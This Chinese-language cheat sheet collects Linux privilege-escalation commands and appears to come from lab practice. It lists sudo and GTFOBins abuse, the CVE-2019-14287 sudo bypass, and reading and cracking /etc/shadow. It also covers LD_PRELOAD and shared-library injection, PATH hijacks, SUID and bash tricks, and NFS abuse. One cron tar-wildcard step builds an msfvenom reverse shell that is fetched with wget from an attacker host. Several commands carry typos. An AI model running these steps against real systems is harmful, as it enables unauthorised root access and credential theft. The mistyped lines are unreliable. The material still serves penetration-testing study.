### 查看当前用户
    cl

---
### 查看当前目录
    pwd

---

## sudo提权
### 枚举
    sudo -l
### 切换用户
    sudo -u jack /bin/bash
    sudo -u#10000 /bin/bash
### 修改交互更好的bash环境
    python -c "import pty;pty.spawn('/bin/bash')"
### 搜索
    grep -R -i pass /home/* 2>dev/null
### sudo -u提权
    sudo -V | grep version 
    'Sudo version 1.7.4p4'
    sudo -u#-1 /bin/bash
### sudo apt(apt-get)提权
    sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
### sudo apache2提权
    sudo apache2 -f /etc/shadow
    vim shadow_root
    sudo john shadow_root --wordlist=/usr/share/wordlists/rockyou.txt
### sudo ash提权
    sudo ash
### sudo awk提权
    sudo awk 'BEGIN {system("/bin/bash)}'
### sudo环境变量提权
    'env_reset,env_keep+=LD_PRELOAD'
    vim 共享库
    编译
    sudo LD_PRELOAD=/home/user/共享库 find
### 提权大全
    https://gtfobins.github.io/
---
## 可读可写shadow和passwd文件利用提权
- 可读shadow
1. 查看权限
	`ls -liah /etc/pshadow`
	![[Pasted image 20250505181903.png]]
2. 读取shadow文件
	`cat /etc/shadow`
3. 提取特殊用户
	`cat /etc/shadow | grep ':\$'
4. john破解
	 `sudo john hash/hash.lst --wordlist=/usr/share/wordlists/rockyou.txt`

- 可写shadow
1. 查看权限
	`ls -liah /etc/shadow`
2. 备份
	`cp /etc/shadow /tmp/shadow.bak`
3. mkpasswd
	`mkpasswd -m sha-512 admin`
4. vim修改密码

- 可写passwd
1. 查看权限
	`ls -liah /etc/passwd`
2. 读取passwd文件
	`cat /etc/passwd`
3. `openssl passwd admin`
4. ``cp /etc/passwd /tmp/passwd.bak``
5. 修改x
	![[Pasted image 20250505221045.png]]

## sudo环境提权
1. 如果sudo -l 有env_keep=LD_PRELOAD
	![[Pasted image 20250505225007.png]]
2. 使用C的root shell
3. `gcc -fPIC -shared -o shell.so shell.c -nostartfiles  `
4. `sudo LD_PRELOAD=/home/user/shell.so find   `

## 自动任务提权
- 文件权限
1. `cat /etc/crontab `
2. ![[Pasted image 20250505231657.png]]
3. `locate overwrite.sh`
4. `ls -liah /usr/local/bin/overwrite.sh`

- PATH环境变量提权
1. ![[Pasted image 20250505232902.png]]
2. `pwd`
3. `chmod +xs overwrite.sh `
4. `/tmp/rootbash -p`

- tar打包
1. `sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf`
2. `sudo php -S 0:80 `
3. `wget http://10.10.10.5/shell.elf  `
4. `chmod +xs shell.elf `
5. `touch /home/user/--checkpoint=1   `
6. `touch /home/user/--checkpoint-action=exec=shell.elf   `

## SUID提权
- 可执行文件
1. ``find / -perm -u=s -type f 2>/dev/null
2. `searchsploit exim 4.84  `
3. `searchsploit exim 4.84 -m 39535 `
4. `sudo php -S 0:80 `

- 共享库注入权限
1. `/usr/local/bin/suid-so `
2. `strings /usr/local/bin/suid-so  `
3. `strace /usr/local/bin/suid-so 2>&1 | grep '/home/user'  `
4. `vim`
5. `gcc -shared -fPIC -o libcalc.so libcalc.**c**z`
6. `/usr/local/bin/suid-so`

- 环境变量利用提权
1. `strings /usr/local/bin/suid-env`
2. `gcc -o service service.c`
3. `export PATH=.:$PATH`
4. `echo $PATH
5. `/usr/local/bin/suid-env`

- bash<4.2
1. `/bin/bash --version`
2. `function /usr/sbin/service { /bin/bash -p; }`
3. `export -f /usr/sbin/service `

- bash<4.4
1. `bash --version`
2. ` env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2  `
3. `/usr/local/bin/suid-env2`

## 历史记录
- 历史文件暴露
1. `cat ~/.*history | grep "pass"`

- 密钥配置文件
1. `ls -liah`
2. `cat myvpn.ovpn`
3. `cat /etc/openvpn/auth.txt`

-  SSH密钥敏感信息提权
1. `ls -liah /`
	- `find / -name authorized_key 2>/dev/null`
	- `find / -name id_rsa 2>/dev/null`
2. `ls -liah /.ssh`
3. `vim id_rsa`
4. `chmod 600 id_rsa`
5. `ssh -i id_rsaroot@10.10.10.12`

## NFS提权
1. `cat /etc/exports`
2. `sudo mkdir /tmp/nfs  `
3. `sudo mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs`
4. `cd /tmp/nfs`
5. `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
6. `sudo chmod +xs shell.elf`

## doad less+vi提权
1. `find / -perm -u=s -type f 2>/dev/null`
2. `cat /tc/doas.conf`

## CVE-2019-14287
1. `sudo -V | grep version`
		sudo <= 1.8.28
2. `sudo -u#-1 /bin/bash`

## sudo提权（全）
- sudo apt
	1. `sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash`
- sudo ash
	1. `sudo ash`
- sudo awk
	1. `sudo awk 'BEGIN {system("/bin/bash")}'`
- sudo base64
	1. `ATTACT=/etc/shadow`
	2. `sudo base64 "$ATTACT" | base64 --decode`